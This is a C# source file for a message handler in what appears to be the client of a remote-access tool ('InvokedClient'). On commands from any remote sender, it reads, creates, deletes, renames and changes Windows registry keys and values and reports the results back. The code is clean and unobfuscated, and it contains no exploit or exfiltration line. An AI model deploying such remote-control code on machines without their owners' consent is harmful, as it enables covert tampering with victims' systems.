

using System;
using InvokedClient.Extensions;
using InvokedClient.Helper;
using InvokedClient.Registry;
using InvokedCommon.Messages;
using InvokedCommon.Models;
using InvokedCommon.Networking;


namespace InvokedClient.MessageHandlers
{
	public class RegistryHandler : IMessageProcessor
	{
		public bool CanExecute(IMessage message)
		{
			switch (message)
			{
				case DoLoadRegistryKey _:
				case DoCreateRegistryKey _:
				case DoDeleteRegistryKey _:
				case DoRenameRegistryKey _:
				case DoCreateRegistryValue _:
				case DoDeleteRegistryValue _:
				case DoRenameRegistryValue _:
					return true;
				default:
					return message is DoChangeRegistryValue;
			}
		}

		public bool CanExecuteFrom(ISender sender) => true;

		public void Execute(ISender sender, IMessage message)
		{
			switch (message)
			{
				case DoLoadRegistryKey message1:
					this.Execute(sender, message1);
					break;
				case DoCreateRegistryKey message2:
					this.Execute(sender, message2);
					break;
				case DoDeleteRegistryKey message3:
					this.Execute(sender, message3);
					break;
				case DoRenameRegistryKey message4:
					this.Execute(sender, message4);
					break;
				case DoCreateRegistryValue message5:
					this.Execute(sender, message5);
					break;
				case DoDeleteRegistryValue message6:
					this.Execute(sender, message6);
					break;
				case DoRenameRegistryValue message7:
					this.Execute(sender, message7);
					break;
				case DoChangeRegistryValue message8:
					this.Execute(sender, message8);
					break;
			}
		}

		private void Execute(ISender client, DoLoadRegistryKey message)
		{
			GetRegistryKeysResponse message1 = new GetRegistryKeysResponse();
			try
			{
				RegistrySeeker registrySeeker = new RegistrySeeker();
				registrySeeker.BeginSeeking(message.RootKeyName);
				message1.Matches = registrySeeker.Matches;
				message1.IsError = false;
			}
			catch (Exception ex)
			{
				message1.IsError = true;
				message1.ErrorMsg = ex.Message;
			}
			message1.RootKey = message.RootKeyName;
			client.Send<GetRegistryKeysResponse>(message1);
		}

		private void Execute(ISender client, DoCreateRegistryKey message)
		{
			GetCreateRegistryKeyResponse message1 = new GetCreateRegistryKeyResponse();
			string name = "";
			string errorMsg;
			try
			{
				message1.IsError = !RegistryEditor.CreateRegistryKey(message.ParentPath, out name, out errorMsg);
			}
			catch (Exception ex)
			{
				message1.IsError = true;
				errorMsg = ex.Message;
			}
			message1.ErrorMsg = errorMsg;
			message1.Match = new RegSeekerMatch()
			{
				Key = name,
				Data = RegistryKeyHelper.GetDefaultValues(),
				HasSubKeys = false
			};
			message1.ParentPath = message.ParentPath;
			client.Send<GetCreateRegistryKeyResponse>(message1);
		}

		private void Execute(ISender client, DoDeleteRegistryKey message)
		{
			GetDeleteRegistryKeyResponse message1 = new GetDeleteRegistryKeyResponse();
			string errorMsg;
			try
			{
				message1.IsError = !RegistryEditor.DeleteRegistryKey(message.KeyName, message.ParentPath, out errorMsg);
			}
			catch (Exception ex)
			{
				message1.IsError = true;
				errorMsg = ex.Message;
			}
			message1.ErrorMsg = errorMsg;
			message1.ParentPath = message.ParentPath;
			message1.KeyName = message.KeyName;
			client.Send<GetDeleteRegistryKeyResponse>(message1);
		}

		private void Execute(ISender client, DoRenameRegistryKey message)
		{
			GetRenameRegistryKeyResponse message1 = new GetRenameRegistryKeyResponse();
			string errorMsg;
			try
			{
				message1.IsError = !RegistryEditor.RenameRegistryKey(message.OldKeyName, message.NewKeyName, message.ParentPath, out errorMsg);
			}
			catch (Exception ex)
			{
				message1.IsError = true;
				errorMsg = ex.Message;
			}
			message1.ErrorMsg = errorMsg;
			message1.ParentPath = message.ParentPath;
			message1.OldKeyName = message.OldKeyName;
			message1.NewKeyName = message.NewKeyName;
			client.Send<GetRenameRegistryKeyResponse>(message1);
		}

		private void Execute(ISender client, DoCreateRegistryValue message)
		{
			GetCreateRegistryValueResponse message1 = new GetCreateRegistryValueResponse();
			string name = "";
			string errorMsg;
			try
			{
				message1.IsError = !RegistryEditor.CreateRegistryValue(message.KeyPath, message.Kind, out name, out errorMsg);
			}
			catch (Exception ex)
			{
				message1.IsError = true;
				errorMsg = ex.Message;
			}
			message1.ErrorMsg = errorMsg;
			message1.Value = RegistryKeyHelper.CreateRegValueData(name, message.Kind, message.Kind.GetDefault());
			message1.KeyPath = message.KeyPath;
			client.Send<GetCreateRegistryValueResponse>(message1);
		}

		private void Execute(ISender client, DoDeleteRegistryValue message)
		{
			GetDeleteRegistryValueResponse message1 = new GetDeleteRegistryValueResponse();
			string errorMsg;
			try
			{
				message1.IsError = !RegistryEditor.DeleteRegistryValue(message.KeyPath, message.ValueName, out errorMsg);
			}
			catch (Exception ex)
			{
				message1.IsError = true;
				errorMsg = ex.Message;
			}
			message1.ErrorMsg = errorMsg;
			message1.ValueName = message.ValueName;
			message1.KeyPath = message.KeyPath;
			client.Send<GetDeleteRegistryValueResponse>(message1);
		}

		private void Execute(ISender client, DoRenameRegistryValue message)
		{
			GetRenameRegistryValueResponse message1 = new GetRenameRegistryValueResponse();
			string errorMsg;
			try
			{
				message1.IsError = !RegistryEditor.RenameRegistryValue(message.OldValueName, message.NewValueName, message.KeyPath, out errorMsg);
			}
			catch (Exception ex)
			{
				message1.IsError = true;
				errorMsg = ex.Message;
			}
			message1.ErrorMsg = errorMsg;
			message1.KeyPath = message.KeyPath;
			message1.OldValueName = message.OldValueName;
			message1.NewValueName = message.NewValueName;
			client.Send<GetRenameRegistryValueResponse>(message1);
		}

		private void Execute(ISender client, DoChangeRegistryValue message)
		{
			GetChangeRegistryValueResponse message1 = new GetChangeRegistryValueResponse();
			string errorMsg;
			try
			{
				message1.IsError = !RegistryEditor.ChangeRegistryValue(message.Value, message.KeyPath, out errorMsg);
			}
			catch (Exception ex)
			{
				message1.IsError = true;
				errorMsg = ex.Message;
			}
			message1.ErrorMsg = errorMsg;
			message1.KeyPath = message.KeyPath;
			message1.Value = message.Value;
			client.Send<GetChangeRegistryValueResponse>(message1);
		}
	}
}